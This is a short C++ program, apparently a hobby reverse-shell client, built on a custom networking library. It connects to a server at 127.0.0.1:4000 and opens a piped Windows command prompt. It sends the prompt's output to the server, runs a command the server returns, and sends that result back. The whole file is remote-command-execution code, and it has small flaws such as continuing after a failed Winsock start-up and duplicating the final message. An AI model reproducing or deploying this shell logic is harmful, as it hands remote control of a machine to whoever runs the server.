#include <MNet\Networking.h>
#include "CommandPrompt.h"

using namespace MNet;

int main()
{
	if (not WSA::StartUp())
	{
		std::cout << "Failed to start up Winsock." << std::endl;
	}

	std::cout << "[+] Winsock successfuly initialized." << std::endl;

	Client client;
	client.Connect("127.0.0.1", "4000");

	CommandPrompt console;
	console.InitializeCmdPipe();
	console.Launch();

	Packet packet;
	console.Cmd2Buffer();

	std::string message = console.GetCmdOutput();

	packet.InsertString(message);
	client.serverConn.Send(packet);

	client.serverConn.Recv(packet);
	message = packet.ExtractString() + '\n';

	console.Buffer2Cmd(message);
	console.Cmd2Buffer();

	message = console.GetCmdOutput();

	packet.Clear();
	packet.InsertString(message);

	packet.InsertString(message);
	client.serverConn.Send(packet);


	system("pause");
	WSA::ShutDown();


}